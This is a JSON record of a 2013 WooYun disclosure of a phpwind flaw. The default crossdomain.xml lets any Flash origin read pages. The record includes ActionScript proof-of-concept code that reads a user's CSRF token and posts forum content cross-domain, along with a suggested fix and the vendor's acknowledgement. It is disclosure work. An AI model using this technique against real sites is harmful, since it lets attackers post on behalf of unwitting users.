{"id": 8273, "wybug_id": "wooyun-2013-038432", "wybug_title": "phpwind配置不当可导致CSRF发帖", "wybug_corp": "phpwind", "wybug_author": "p.z", "wybug_date": "2013-09-28 14:26", "wybug_open_date": "2013-11-12 14:27", "wybug_type": "应用配置错误", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-10-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-10-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-10-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-11-12：\t细节向公众公开  简要描述： phpwind配置不当可导致CSRF发帖 详细说明：  crossdomain.xml的默认设置：\n<?xml version=\"1.0\"?>-<cross-domain-policy> <allow-access-from domain=\"*\"/><!-- flash跨域策略，domain建议设置为 *.你的站点域名 --> </cross-domain-policy>\n虽然有建议 但是普通站长谁没事改这个啊，还不如你们在安装时直接根据host重写下crossdomain.xml得了。先取到csrf的token\n\n\nfunction gethash() {    function getformhash(txt) {        txt = txt.split('csrf_token\" value=\"')[1].split('\"')[0];        return txt;    }    var result_lv:LoadVars = new LoadVars();    result_lv.onData = function(txt) {        if (txt) {            txt = getformhash(txt);        } else {            txt = \"Error connecting to server.\";        }        trace(txt);    };    var send_lv:LoadVars = new LoadVars();    method = 'GET';    url = \"http://localhost:8080/index.php?c=post&fid=2\";    send_lv.sendAndLoad(url,result_lv,method);}gethash()\n然后csrf发帖 pw这里甚至没有对refer进行检查 可以直接外域提交\n\n\nfunction dopost() {    var result_lv:LoadVars = new LoadVars();    result_lv.onData = function(txt) {        trace(txt);    };    var send_lv:LoadVars = new LoadVars();    method = 'post';    url = \"http://localhost:8080/index.php?c=post&a=doadd&_json=1&fid=2\";    send_lv['csrf_token'] = '{{ csrf_token }}';    send_lv['atc_title'] = '1380343694';    send_lv['atc_content'] = '12112123123sdf1';    send_lv['pid'] = '';    send_lv['tid'] = '';    send_lv['special'] = 'default';    send_lv.sendAndLoad(url,result_lv,method);}dopost()\n   漏洞证明：     修复方案：  删了那个文件吧，或者重写吧，千万不要让他站在敌人的那一边。   版权声明：转载请注明来源 p.z@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2013-09-29 16:31 厂商回复： 感谢你对我们的支持与关注，该问题我们正在修复~ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-09-28 19:13 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  pz姐最近寂寞了么    \n     2013-09-28 23:46 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  肯定和那个dz的一个道理    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}